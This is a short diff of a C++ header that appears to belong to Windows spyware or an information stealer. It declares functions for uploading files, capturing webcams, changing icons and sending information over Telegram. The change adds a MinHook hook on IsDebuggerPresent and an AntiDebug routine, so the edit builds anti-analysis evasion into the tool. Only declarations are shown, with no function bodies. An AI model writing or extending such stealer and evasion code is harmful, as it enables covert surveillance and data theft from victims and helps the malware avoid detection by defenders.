@@ -3,6 +3,9 @@
 #include "json.hpp"
 #include <sstream>
 #include <dshow.h>
+#include <cstdint>
+#include <MinHook.h>
+#include <DbgHelp.h>
 #include <wininet.h>
 #include <atlimage.h>
 #include <winternl.h>
@@ -62,3 +65,5 @@ void UploadFiles(const std::vector<std::string>& files);
 void TakeWebcams();
 void ChangeIcon();
 void SendTelegramInfo();
+BOOL WINAPI HookIsDebuggerPresent();
+bool AntiDebug();
